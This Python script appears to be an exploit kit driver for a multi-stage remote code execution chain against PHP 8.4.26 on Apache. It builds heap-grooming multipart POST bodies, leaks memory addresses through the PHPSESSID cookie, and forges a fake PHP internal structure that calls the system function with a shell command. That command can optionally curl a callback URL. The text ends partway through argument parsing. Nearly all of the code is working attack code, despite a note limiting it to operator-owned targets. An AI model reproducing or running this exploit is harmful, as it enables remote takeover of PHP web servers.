#!/usr/bin/env python3
"""Self-contained A1 -> B1 -> A2 -> B2 driver for the PHP 8.4.26 kit.

Target: official php:8.4.26-apache (PHP 8.4.26 NTS, Apache 2.4.69, mod_php,
stock prefork).  This module is intentionally independent of the research
repository and of IDA.  The HTTP protocol and the B2 builder are vendored
from the audited research runner; the three large request bodies are shipped
gzip-compressed under bodies/ and are hash-checked before use.

The runner never pins a worker, never kills/restarts a child, and never uses
mod_unique_id.  Worker identity comes only from the Apache access log
(%P child pid, added by conf/p2s.conf as an observation-only delta).
"""
from __future__ import annotations

import argparse
import gzip
import hashlib
import json
import os
import re
import shlex
import socket
import struct
import sys
import time
import urllib.parse
from collections import Counter
from pathlib import Path

BOUNDARY = b"C" * 10
A1_QUERY = "q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
B1_SPEC = ("G:511:0x137 " * 14 + "G:400:0x137 G:511:0x137 X:900").split()

# Exact upstream-8.4.26 geometry (libphp-8.4.26.so sha256 51663cf8...).
S_OFF = 0xF8398
ZIF_SYSTEM_OFF = 0x465370
ZVAL_PTR_DTOR_OFF = 0x65EB60
MAIN_BUCKET = 87

EXPECTED_LIBPHP_SHA256 = "51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c"
EXPECTED_PHP_INI_SHA256 = "8d6fcbbcff186958a3609e277f8db249122a89d01e8401b1861f5bd4283f148a"
EXPECTED_WP_ZIP_SHA256 = "eb58a90ed55147f90f7bd55d0d3334960a69b7e8a4cc142c8ddfea8965218227"

DEFAULT_IMAGE = "php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a"
DEFAULT_ENDPOINT = "/wp-content/index.php"
MARKER_RE = re.compile(r"^[A-Za-z0-9_.-]{1,32}$")


# ---------------------------------------------------------------------------
# Body builders (vendored, byte-compatible with the audited research tree)
# ---------------------------------------------------------------------------

def _part(name: bytes, value: bytes = b"", filename: bytes | None = None,
          ctype: bytes | None = None, terminate: bool = True) -> bytes:
    out = bytearray(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        out.extend(b"; filename=\"" + filename + b"\"")
    out.extend(b"\r\n")
    if ctype is not None:
        out.extend(b"Content-Type: " + ctype + b"\r\n")
    out.extend(b"\r\n" + value)
    if terminate:
        out.extend(b"\r\n")
    return bytes(out)


def _nest_name(i: int, depth: int, key_pad: int = 0) -> bytes:
    if depth < 2:
        raise ValueError("depth must be >= 2")
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def _tag8(idx: int, tagged: bool) -> bytes:
    if tagged:
        return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
    return b"BBBB/BBB"


def _forge_fill_value(pages: int, page: int, fake_len: int,
                      idx: int = 0, tagged: bool = True) -> bytes:
    length = pages * 4096 - 25
    value = bytearray(b"A" * length)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= length:
        struct.pack_into("<I", value, hdr + 0x00, 0)
        struct.pack_into("<I", value, hdr + 0x04, 0x16)
        struct.pack_into("<Q", value, hdr + 0x08, 0)
        struct.pack_into("<Q", value, hdr + 0x10, fake_len)
        value[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(value)


def build_a1(parts: int = 860, depth: int = 64, key_pad: int = 90,
             fillers128: int = 14, big: int = 78, big_len: int = 8000,
             burners: int = 20, burner_len: int = 4000,
             progress_len: int = 4000, sid_hex: str = "00") -> bytes:
    """mk_a1.py defaults.  build_a1(big_len=7150) is the shipped A1."""
    out = bytearray()
    out += _part(b"PHPSESSID", bytes.fromhex(sid_hex))
    for i in range(parts):
        is_mixed = i == 0
        is_mixed2 = i == 1
        ctype = (b"C" * 103 if is_mixed else
                 b"C" * 231 if is_mixed2 else b"application/octet-stream")
        out += _part(
            _nest_name(i, depth, key_pad),
            filename=b"A" if (is_mixed or is_mixed2) else b"",
            ctype=ctype,
            terminate=False,
        )
    for i in range(fillers128):
        out += _part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        out += _part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        out += _part(("u%02d" % i).encode(), b"U" * burner_len)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_b1(spec: list[str] | None = None, fake_len: int = 0xC8000,
             tag: bool = True, sid: bytes = b"a", progress: bytes = b"k0",
             name_len: int = 120) -> bytes:
    """mk_leak_b.py spec used for the Debian/upstream B1 leak."""
    out = bytearray()
    out += _part(b"PHPSESSID", sid)
    if not any(item.partition(":")[0] == "P" for item in (spec or [])):
        out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    idx = 0
    for item in (spec or B1_SPEC):
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            pages = int(arg, 0)
            value = (b"A" if kind == "F" else b"S") * (pages * 4096 - 25)
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            value = _forge_fill_value(int(pages_s, 0), int(page_s, 0),
                                      fake_len, idx, tag)
        elif kind == "X":
            for _ in range(int(arg, 0)):
                out += _part(("x%05d" % idx).encode() + b"[a]" * 12, b"v")
                idx += 1
            continue
        else:
            raise ValueError("unsupported B1 spec item %r" % item)
        name = (b"f%04d" % idx).ljust(name_len, b"f")[:name_len]
        out += _part(name, value)
        idx += 1
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_a2(parts: int = 880, depth: int = 64, fillers: int = 116,
             sid: bytes = b"a" * 32, progress: bytes = b"k0") -> bytes:
    """cheap_oom_a.build_body(880, 64, fillers, b"a"*32, b"k0", b"C"*10)."""
    out = bytearray()
    out += _part(b"PHPSESSID", sid)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(fillers):
        out += _part(("%03d" % i).encode(), b"x")
    for i in range(parts):
        out += _part(_nest_name(i, depth, 0), filename=b"",
                     ctype=b"application/octet-stream", terminate=False)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def _fake_ref(ptr: int, rc: int, val_type: int) -> bytes:
    value = bytearray(32)
    struct.pack_into("<I", value, 0, rc)
    value[4] = 0x0A
    struct.pack_into("<Q", value, 8, ptr)
    struct.pack_into("<I", value, 16, val_type)
    return bytes(value)


def _make_spray(vl: int, ptr: int, rc: int, val_type: int,
                ref_start: int = 8, ref_step: int = 32) -> bytes:
    value = bytearray(b"S" * vl)
    off = ref_start
    while off + 32 <= vl:
        value[off:off + 32] = _fake_ref(ptr, rc, val_type)
        off += ref_step
    return bytes(value)


def _make_name(prefix: bytes, i: int, nlen: int) -> bytes:
    base = prefix + ("%09d" % i).encode()
    return (base + b"x" * nlen)[:nlen]


def build_ht(htdata: int, zif: int, cmd: bytes, size: int = 384) -> bytes:
    """mk_ht.py build(): fake zend_array + fake execute_data + argument string."""
    if len(cmd) > 0x160 - 0x98:
        raise ValueError(
            "B2 command is %d bytes; the 384-byte ht carrier holds at most %d"
            % (len(cmd), 0x160 - 0x98)
        )
    ht = bytearray(b"\x00" * size)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    e = 0x20
    struct.pack_into("<Q", ht, e + 0x00, 0)
    struct.pack_into("<Q", ht, e + 0x08, 0)
    struct.pack_into("<Q", ht, e + 0x10, zif)
    struct.pack_into("<Q", ht, e + 0x18, 0)
    struct.pack_into("<Q", ht, e + 0x20, 0)
    struct.pack_into("<I", ht, e + 0x28, 0)
    struct.pack_into("<I", ht, e + 0x2C, 1)
    struct.pack_into("<Q", ht, e + 0x30, 0)
    struct.pack_into("<Q", ht, e + 0x38, 0)
    struct.pack_into("<I", ht, e + 0x40, 0)
    struct.pack_into("<Q", ht, e + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, e + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def build_b2(s: int, zif: int, cmd: bytes, vl: int = 384,
             n1: int = 500, n2: int = 495, name_len: int = 10) -> bytes:
    """fake_ref_b.py spray + mk_ht.py ht; 451,384 bytes for this geometry."""
    spray = _make_spray(vl, s, 1, 0x0107, 8, 32)
    ht = build_ht(s, zif, cmd, vl)
    out = bytearray()
    for i in range(n1):
        out += _part(_make_name(b"s", i, name_len), spray)
    out += _part(b"ht", ht)
    out += _part(b"PHPSESSID", b"a" * 32)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        out += _part(_make_name(b"t", i, name_len), spray)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_payload(command: str, marker: str, proof_path: str,
                  callback_url: str | None) -> str:
    """Shell command executed by the fake zif_system; max 200 bytes."""
    proof = shlex.quote(proof_path)
    tail = ""
    if callback_url:
        url = callback_url.rstrip("/") + "/" + marker
        tail = "; curl -s -m 3 %s >/dev/null 2>&1" % shlex.quote(url)
    if command == "id":
        variants = [
            "id>%s;echo %s>>%s;id>&2;echo %s>&2%s" % (proof, marker, proof, marker, tail),
            "id>%s;echo %s>>%s;echo %s>&2%s" % (proof, marker, proof, marker, tail),
            "id>%s;echo %s>>%s%s" % (proof, marker, proof, tail),
        ]
    else:
        variants = [
            "%s>%s 2>&1;cat %s>&2;echo %s>&2%s" % (command, proof, proof, marker, tail),
            "%s>%s 2>&1;echo %s>>%s;cat %s>&2%s" % (command, proof, marker, proof, proof, tail),
            "%s>%s 2>&1;echo %s>>%s%s" % (command, proof, marker, proof, tail),
        ]
    for variant in variants:
        if len(variant.encode("utf-8")) <= 0x160 - 0x98:
            return variant
    raise ValueError(
        "B2 command is %d bytes after assembly; the ht carrier allows at most %d. "
        "Shorten --marker, --proof-file or --callback."
        % (len(variants[-1].encode("utf-8")), 0x160 - 0x98)
    )


# ---------------------------------------------------------------------------
# Bodies
# ---------------------------------------------------------------------------

def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def sha256_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def load_bodies(kit_root: str) -> tuple[dict[str, bytes], dict[str, dict]]:
    manifest_path = os.path.join(kit_root, "bodies", "manifest.json")
    with open(manifest_path, "r", encoding="utf-8") as fh:
        manifest = json.load(fh)
    records: dict[str, dict] = {}
    out: dict[str, bytes] = {}
    work = os.path.join(kit_root, "work", "bodies")
    os.makedirs(work, exist_ok=True)
    for name, item in manifest["bodies"].items():
        raw_path = os.path.join(work, name + ".bin")
        gz_path = os.path.join(kit_root, item["file"])
        expected_size = int(item["uncompressed_bytes"])
        expected_hash = item["sha256"]
        data = None
        if os.path.exists(raw_path):
            with open(raw_path, "rb") as fh:
                data = fh.read()
            if len(data) != expected_size or sha256_bytes(data) != expected_hash:
                data = None
        if data is None:
            if not os.path.exists(gz_path):
                raise SystemExit("missing body %s (raw and gzip absent)" % name)
            with gzip.open(gz_path, "rb") as fh:
                data = fh.read()
            if len(data) != expected_size or sha256_bytes(data) != expected_hash:
                raise SystemExit(
                    "body %s failed verification: got %d/%s expected %d/%s"
                    % (name, len(data), sha256_bytes(data), expected_size, expected_hash)
                )
            tmp = raw_path + ".tmp"
            with open(tmp, "wb") as fh:
                fh.write(data)
            os.replace(tmp, raw_path)
        out[name] = data
        records[name] = {
            "bytes": len(data),
            "sha256": sha256_bytes(data),
            "expected_bytes": expected_size,
            "expected_sha256": expected_hash,
            "ok": True,
        }
    return out, records


# ---------------------------------------------------------------------------
# HTTP transport
# ---------------------------------------------------------------------------

def _head(path: str, host_header: str, body_len: int | None, mode: str) -> bytes:
    out = (
        "POST %s HTTP/1.1\r\nHost: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        % (path, host_header, BOUNDARY.decode())
    ).encode("ascii")
    if mode == "chunked":
        out += b"Transfer-Encoding: chunked\r\n"
    else:
        out += b"Content-Length: %d\r\n" % body_len
    out += b"Connection: close\r\n\r\n"
    return out


def send_http(host: str, port: int, path: str, body: bytes, mode: str,
              timeout: float = 180.0, max_resp: int = 32 << 20,
              chunk: int = 65536) -> tuple[bytes, float, str | None]:
    """mode: chunked | plain | get.  Returns (raw, seconds, error-or-None)."""
    started = time.time()
    host_header = host if port == 80 else "%s:%d" % (host, port)
    if ":" in host and not host.startswith("["):
        host_header = "[%s]:%d" % (host, port)
    out = bytearray()
    err = None
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=min(10.0, timeout))
        sock.settimeout(timeout)
        if mode == "get":
            sock.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"
                          % (path, host_header)).encode("ascii"))
        elif mode == "chunked":
            sock.sendall(_head(path, host_header, None, mode))
            for off in range(0, len(body), chunk):
                piece = body[off:off + chunk]
                sock.sendall(("%x\r\n" % len(piece)).encode("ascii") + piece + b"\r\n")
            sock.sendall(b"0\r\n\r\n")
        else:
            sock.sendall(_head(path, host_header, len(body), mode) + body)
        while len(out) < max_resp:
            try:
                data = sock.recv(262144)
            except (socket.timeout, TimeoutError):
                break
            except OSError as exc:
                err = repr(exc)
                break
            if not data:
                break
            out.extend(data)
    except OSError as exc:
        err = repr(exc)
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
    return bytes(out), time.time() - started, err


def status(raw: bytes) -> tuple[int, str]:
    line = raw.split(b"\r\n", 1)[0].decode("latin1", "replace")
    parts = line.split()
    try:
        code = int(parts[1])
    except (IndexError, ValueError):
        code = 0
    return code, line


def parse_leak(raw: bytes, zdtor_off: int = ZVAL_PTR_DTOR_OFF,
               main_bucket_count: int = MAIN_BUCKET) -> dict:
    head, _, _ = raw.partition(b"\r\n\r\n")
    hay = head if b"et-Cookie" in head else raw
    low = hay.lower()
    marker = b"set-cookie: phpsessid="
    idx = low.find(marker)
    if idx < 0:
        raise ValueError("no Set-Cookie: PHPSESSID")
    value = hay[idx + len(marker):].split(b"\r\n", 1)[0]
    dec = urllib.parse.unquote_to_bytes(value.decode("latin1"))
    counts: Counter[int] = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= 0x7FFFFFFFFFFFFF:
            counts[q] += 1
    if not counts:
        raise ValueError("no 0x7f pointers in decoded cookie (%d bytes)" % len(dec))
    zdtor, top = counts.most_common(1)[0]
    lib = zdtor - zdtor_off
    buckets: Counter[int] = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common()
             if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - main_bucket_count), bc[1]))
    return {
        "decoded": len(dec),
        "zdtor": zdtor,
        "lib": lib,
        "top_hits": top,
        "main_candidates": [b for b, _ in cands[:3]],
        "cand_counts": {hex(b): c for b, c in cands[:3]},
    }


# ---------------------------------------------------------------------------
# Logs and proof
# ---------------------------------------------------------------------------

class FileTail:
    def __init__(self, path: str | None):
        self.path = path
        self.off = 0
        if path and os.path.exists(path):
            self.off = os.path.getsize(path)

    def mark(self) -> int:
        return self.off

    def read_from(self, start: int) -> bytes:
        if not self.path or not os.path.exists(self.path):
            return b""
        size = os.path.getsize(self.path)
        if size < start:
            start = 0
        with open(self.path, "rb") as fh:
            fh.seek(start)
            data = fh.read()
        self.off = start + len(data)
        return data

    def wait_new(self, start: int, timeout: float = 2.0) -> bytes:
        deadline = time.time() + timeout
        while time.time() < deadline:
            data = self.read_from(start)
            if data:
                return data
            time.sleep(0.004)
        return b""


def parse_access_line(line: str) -> dict | None:
    f = line.split()
    if len(f) < 6:
        return None
    try:
        return {
            "pid": f[0],
            "ts": f[1],
            "method": f[2],
            "uri": f[3],
            "status": int(f[4]) if f[4].isdigit() else 0,
            "bytes": None if f[5] == "-" else int(f[5]),
            "us": int(f[6]) if len(f) > 6 and f[6].isdigit() else None,
        }
    except ValueError:
        return None


def read_json(path: str) -> dict | None:
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, ValueError):
        return None


def write_json(path: str, obj: object) -> None:
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as fh:
        json.dump(obj, fh, indent=1, sort_keys=True)
        fh.write("\n")
    os.replace(tmp, path)


def proof_check(path: str | None, marker: str) -> dict | None:
    if not path or not os.path.exists(path):
        return None
    try:
        text = open(path, "r", encoding="utf-8", errors="replace").read()
    except OSError:
        return None
    if marker not in text:
        return None
    return {
        "path": path,
        "text": text[-4096:],
        "bytes": os.path.getsize(path),
        "sha256": sha256_file(path),
        "has_uid": "uid=" in text,
        "has_www_data": "uid=33(www-data)" in text,
    }


def docker_children(container: str) -> list[int]:
    if not container:
        return []
    cmd = [
        "docker", "exec", container, "sh", "-c",
        "p=$(cat /var/run/apache2/apache2.pid 2>/dev/null); "
        "echo parent=$p; ps -o pid=,ppid= -C apache2 2>/dev/null",
    ]
    try:
        import subprocess
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    except Exception:  # noqa: BLE001
        return []
    parent = "1"
    rows = []
    for line in out.stdout.splitlines():
        if line.startswith("parent="):
            parent = line.split("=", 1)[1].strip() or "1"
            continue
        p = line.split()
        if len(p) == 2:
            rows.append((p[0], p[1]))
    return [int(pid) for pid, ppid in rows if ppid == parent]


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

class Runner:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.kit_root = os.path.abspath(args.kit_root)
        self.output = os.path.abspath(args.output)
        os.makedirs(self.output, exist_ok=True)
        self.log_path = os.path.join(self.output, "run.log")
        self.log_fh = open(self.log_path, "a", encoding="utf-8")

        self.pool = {}
        if args.pool_dir:
            pool_json = os.path.join(os.path.abspath(args.pool_dir), "pool.json")
            self.pool = read_json(pool_json) or {}
            if not self.pool:
                raise SystemExit("no readable pool.json under --pool-dir %s" % args.pool_dir)

        if not args.url:
            args.url = self.pool.get("url", "")
        if not args.url:
            raise SystemExit("--url is required (or use --pool-dir with pool.json)")
        self.host, self.port, self.path, self.host_header = parse_url(args.url)
        if args.path:
            self.path = args.path
        if not self.path:
            self.path = DEFAULT_ENDPOINT

        # Convenience: if --pool-dir was omitted and the kit created the
        # default pool for this port, pick up its pool.json automatically.
        if not self.pool and not args.pool_dir:
            candidate = os.path.join(self.kit_root, "pools", "p8426_%d" % self.port)
            pool_json = os.path.join(candidate, "pool.json")
            if os.path.exists(pool_json):
                self.pool = read_json(pool_json) or {}

        self.container = args.container or self.pool.get("container", "")
        self.log_dir = args.log_dir or self.pool.get("log_dir", "")
        self.proof_dir = args.proof_dir or self.pool.get("proof_dir", "")
        if not self.log_dir and self.pool.get("pool_dir"):
            self.log_dir = os.path.join(self.pool["pool_dir"], "logs")
        if not self.proof_dir and self.pool.get("pool_dir"):
            self.proof_dir = os.path.join(self.pool["pool_dir"], "proof")

        self.marker = args.marker
        if not MARKER_RE.match(self.marker):
            raise SystemExit("--marker must match %s" % MARKER_RE.pattern)
        if args.proof_file and args.attempts > 1:
            raise SystemExit("--proof-file is only supported with --attempts 1")
        self.proof_file = os.path.abspath(args.proof_file) if args.proof_file else None
        if not self.proof_file and self.proof_dir:
            self.proof_file = os.path.join(os.path.abspath(self.proof_dir), "p1_" + self.marker)

        self.access = FileTail(os.path.join(self.log_dir, "p2s-access.log") if self.log_dir else None)
        self.error = FileTail(os.path.join(self.log_dir, "error.log") if self.log_dir else None)
        self.callback = FileTail(os.path.abspath(args.callback_log) if args.callback_log else None)

        self.bodies, self.body_records = load_bodies(self.kit_root)
        self.a1 = self.bodies["a1_shrink_7150_only"]
        self.b1 = self.bodies["b1_stock"]
        self.a2 = self.bodies["a2_upstream_115"]

        self.meta = {
            "kit": os.path.basename(self.kit_root),
            "kit_root": self.kit_root,
            "url": args.url,
            "endpoint": self.path,
            "host": self.host,
            "port": self.port,
            "marker": self.marker,
            "pool": self.pool,
            "container": self.container,
            "log_dir": self.log_dir,
            "proof_dir": self.proof_dir,
            "proof_file": self.proof_file,
            "attempts": args.attempts,
            "warmup": args.warmup,
            "protocol": {
                "A1": "1 chunked POST (Transfer-Encoding: chunked, no Content-Length)",
                "B1": "sequential chunked POSTs, stop on leak, max %d" % args.b1_max,
                "A2": "%d sequential plain POSTs (Content-Length)" % args.a2_block,
                "B2": "sequential plain POSTs, stop on proof, max %d" % args.b2_max,
            },
            "bodies": self.body_records,
            "offsets": {
                "S": hex(args.s_off),
                "zif_system": hex(args.zif_off),
                "zval_ptr_dtor": hex(args.zdtor_off),
                "main_bucket": args.main_bucket,
                "libphp_sha256_expected": EXPECTED_LIBPHP_SHA256,
            },
            "image": self.pool.get("image", DEFAULT_IMAGE),
            "image_id": self.pool.get("image_id"),
            "php": self.pool.get("php", "8.4.26"),
            "apache": self.pool.get("apache", "2.4.69"),
            "started_utc": utc_now(),
        }
        write_json(os.path.join(self.output, "meta.json"), self.meta)

        self.attempts: list[dict] = []
        self.successes: list[dict] = []
        self.abort_count = 0
        self.segv_count = 0

    def log(self, msg: str) -> None:
        line = "[%s] %s" % (utc_now(), msg)
        print(line, flush=True)
        self.log_fh.write(line + "\n")
        self.log_fh.flush()

    def close(self) -> None:
        self.log_fh.close()

    def err_delta(self, timeout: float = 0.05) -> list[str]:
        start = self.error.mark()
        data = self.error.wait_new(start, timeout=timeout)
        text = data.decode("latin1", "replace") if data else ""
        return [l.strip() for l in text.splitlines()
                if "exit signal" in l or "corrupted" in l
                or "exhausted" in l or "Session ID" in l]

    def stage(self, label: str, path: str, body: bytes | None, mode: str) -> dict:
        start = self.access.mark()
        raw, elapsed, err = send_http(
            self.host, self.port, path, body or b"", mode,
            timeout=self.args.timeout,
        )
        code, line = status(raw)
        if mode == "get":
            entry = None
        else:
            data = self.access.wait_new(start, timeout=2.0)
            lines = [parse_access_line(l) for l in data.decode("latin1", "replace").splitlines()]
            lines = [l for l in lines if l]
            entry = lines[-1] if lines else None
        row = {
            "stage": label,
            "mode": mode,
            "request_bytes": len(body or b""),
            "status": code,
            "status_line": line,
            "resp_bytes": len(raw),
            "elapsed": round(elapsed, 3),
            "pid": entry["pid"] if entry else None,
            "log": entry,
        }
        if err:
            row["error"] = err
        if mode == "chunked" and label.startswith("B1") and b"et-Cookie" in raw:
            try:
                info = parse_leak(raw, self.args.zdtor_off, self.args.main_bucket)
                row["leak_hit"] = True
                row["decoded"] = info["decoded"]
                row["main_candidates"] = [hex(x) for x in info["main_candidates"]]
                row["lib"] = hex(info["lib"])
                row["cand_counts"] = info["cand_counts"]
            except Exception as exc:  # noqa: BLE001
                row["leak_hit"] = False
                row["leak_note"] = str(exc)
        self.log("%s status=%s bytes=%d pid=%s%s" % (
            label, row["status"], row["resp_bytes"], row["pid"],
            " LEAK" if row.get("leak_hit") else ""))
        return row

    def warmup(self) -> list[dict]:
        rows = []
        for i in range(self.args.warmup):
            rows.append(self.stage("GET.%02d" % i, self.path, None, "get"))
        return rows

    def attempt(self, index: int) -> dict:
        marker = self.marker if index == 1 else "%s_%03d" % (self.marker, index)
        proof_path = self.proof_file
        if proof_path and index > 1:
            proof_path = os.path.join(os.path.dirname(proof_path), "p1_" + marker)
        if proof_path:
            try:
                os.unlink(proof_path)
            except FileNotFoundError:
                pass
        callback_start = self.callback.mark()
        rec = {
            "attempt": index,
            "marker": marker,
            "pool_before": docker_children(self.container),
            "t0": utc_now(),
        }
        rec["a1"] = self.stage("A1", self.path + "?" + A1_QUERY, self.a1, "chunked")
        rec["a1_err"] = self.err_delta(0.3)

        b1s = []
        leak = None
        for j in range(self.args.b1_max):
            row = self.stage("B1.%d" % (j + 1), self.path, self.b1, "chunked")
            b1s.append(row)
            if row.get("leak_hit"):
                leak = row
                break
            if row["status"] == 0 and not self.args.continue_on_crash:
                break
        rec["b1"] = b1s
        rec["b1_err"] = self.err_delta(0.5)

        if leak is None:
            rec["result"] = "no B1 leak"
            rec["success"] = False
            self.count_signals(rec)
            self.log("RESULT attempt %d: no B1 leak" % index)
            return rec

        main_addr = int(leak["main_candidates"][0], 16)
        lib_addr = int(leak["lib"], 16)
        s_addr = main_addr + self.args.s_off
        zif_addr = lib_addr + self.args.zif_off
        rec["derived"] = {
            "main": hex(main_addr),
            "lib": hex(lib_addr),
            "S": hex(s_addr),
            "zif_system": hex(zif_addr),
            "lib_minus_main": hex(lib_addr - main_addr),
            "leak_pid": leak.get("pid"),
            "a1_pid": rec["a1"].get("pid"),
            "decoded": leak.get("decoded"),
        }
        self.log("LEAK pid=%s main=%s lib=%s" % (
            leak.get("pid"), hex(main_addr), hex(lib_addr)))

        a2s = []
        for j in range(self.args.a2_block):
            a2s.append(self.stage("A2.%d" % (j + 1), self.path, self.a2, "plain"))
        rec["a2"] = a2s
        rec["a2_err"] = self.err_delta(0.2)

        container_proof = "/out/p1_" + marker
        if self.args.container_proof_file:
            container_proof = self.args.container_proof_file.replace("{marker}", marker)
        payload = build_payload(self.args.command, marker, container_proof,
                                self.args.callback)
        b2 = build_b2(s_addr, zif_addr, payload.encode("utf-8"))
        b2_path = os.path.join(self.output, "b2_%s.bin" % marker)
        with open(b2_path, "wb") as fh:
            fh.write(b2)
        rec["b2_body"] = {"bytes": len(b2), "sha256": sha256_bytes(b2), "path": b2_path}
        rec["payload"] = payload
        rec["container_proof_path"] = container_proof

        b2s = []
        proof = None
        callback_hit = None
        for j in range(self.args.b2_max):
            row = self.stage("B2.%d" % (j + 1), self.path, b2, "plain")
            b2s.append(row)
            time.sleep(0.05)
            proof = proof_check(proof_path, marker)
            if self.args.callback_log:
                data = self.callback.read_from(callback_start)
                if marker.encode() in data:
                    callback_hit = {"marker": marker, "log": self.args.callback_log}
            if proof or callback_hit:
                break
        rec["b2"] = b2s
        rec["proof"] = proof
        rec["callback_hit"] = callback_hit
        rec["result"] = "RCE proof with uid" if proof and proof.get("has_uid") else (
            "proof without uid" if proof else
            "callback hit" if callback_hit else "no proof file")
        rec["success"] = bool(proof and proof.get("has_www_data")) or bool(
            callback_hit and self.args.allow_callback_as_proof)
        rec["b2_err"] = self.err_delta(0.3)

        self.count_signals(rec)
        self.log("RESULT attempt %d: %s" % (index, rec["result"]))
        return rec

    def count_signals(self, rec: dict) -> None:
        errors = " ".join(rec.get("a1_err", []) + rec.get("b1_err", []) +
                          rec.get("a2_err", []) + rec.get("b2_err", []))
        self.abort_count += errors.count("Abort (6)")
        self.segv_count += errors.count("Segmentation fault (11)")

    def run(self) -> int:
        self.log("KIT %s url=%s marker=%s attempts=%d" % (
            self.meta["kit"], self.meta["url"], self.marker, self.args.attempts))
        self.log("pool=%s container=%s" % (self.pool.get("name", "?"), self.container))
        if self.args.warmup:
            self.warmup()
        for i in range(1, self.args.attempts + 1):
            self.log("=== attempt %d marker %s ===" % (
                i, self.marker if i == 1 else "%s_%03d" % (self.marker, i)))
            rec = self.attempt(i)
            self.attempts.append(rec)
            if rec.get("success"):
                self.successes.append(rec)
            write_json(os.path.join(self.output, "attempts.json"),
                       {"attempts": self.attempts})
        result = {
            "kit": self.meta["kit"],
            "url": self.meta["url"],
            "marker": self.marker,
            "success": bool(self.successes),
            "proofs": [{"marker": r["marker"], "proof": r.get("proof")}
                       for r in self.successes],
            "leaks": sum(1 for r in self.attempts if r.get("derived")),
            "aborts": self.abort_count,
            "segv": self.segv_count,
            "attempts_run": len(self.attempts),
            "attempts_requested": self.args.attempts,
            "meta": self.meta,
            "attempts": self.attempts,
        }
        write_json(os.path.join(self.output, "result.json"), result)
        self.log("DONE attempts=%d leaks=%d aborts=%d segv=%d proofs=%d" % (
            len(self.attempts), result["leaks"], self.abort_count,
            self.segv_count, len(self.successes)))
        return 0 if self.successes else 1


def utc_now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def parse_url(url: str) -> tuple[str, int, str, str]:
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme != "http":
        raise SystemExit("URL must be http:// (the chain is plain HTTP)")
    if parsed.username or parsed.password or parsed.fragment:
        raise SystemExit("URL must be uncredentialed and without a fragment")
    if not parsed.hostname:
        raise SystemExit("URL has no host")
    port = parsed.port or 80
    path = parsed.path or DEFAULT_ENDPOINT
    if path == "/":
        path = DEFAULT_ENDPOINT
    path.encode("ascii")
    host_header = parsed.hostname if port == 80 else "%s:%d" % (parsed.hostname, port)
    return parsed.hostname, port, path, host_header


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        description="Send the A1 -> B1 -> A2 -> B2 chain to one PHP 8.4.26 prefork pool.",
        epilog="Research-derived, exact-build chain. Operator-owned targets only.",
    )
    ap.add_argument("--kit-root", default=str(Path(__file__).resolve().parent.parent))
    ap.add_argument("--url", help="endpoint URL, e.g. http://127.0.0.1:18080/wp-content/index.php")
    ap.add_argument("--marker", default="KIT" + time.strftime("%Y%m%dT%H%M%SZ", time.gmtime()))
    ap.add_argument("--attempts", type=int, default=1)
